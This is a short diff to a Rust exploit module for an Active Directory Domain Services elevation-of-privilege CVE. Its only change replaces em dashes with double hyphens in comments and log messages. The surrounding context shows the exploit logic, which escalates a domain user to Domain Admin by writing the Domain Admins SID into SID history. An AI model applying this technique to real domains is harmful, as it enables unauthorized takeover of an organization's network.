@@ -1,4 +1,4 @@
-//! CVE-2026-25177 — Active Directory Domain Services Elevation of Privilege.
+//! CVE-2026-25177 -- Active Directory Domain Services Elevation of Privilege.
 //!
 //! A newly discovered vulnerability in AD DS (March 2026 Patch Tuesday) allows
 //! an authenticated user with basic domain user privileges to elevate to Domain
@@ -160,11 +160,11 @@ pub async fn exploit_ad_ds_eop(
                 privileges.push("Domain Admins".to_string());
             }
             Ok(false) => {
-                log.push("  Not a Domain Admin — trying SID history write".to_string());
+                log.push("  Not a Domain Admin -- trying SID history write".to_string());
                 let da_sid = domain_admin_sid_string(ldap).await;
                 match write_sid_history(ldap, &full_target_dn, da_sid).await {
                     Ok(()) => {
-                        log.push("  SID history written — DA privileges granted".to_string());
+                        log.push("  SID history written -- DA privileges granted".to_string());
                         privileges.push("Domain Admins (via SID history)".to_string());
                     }
                     Err(e) => {
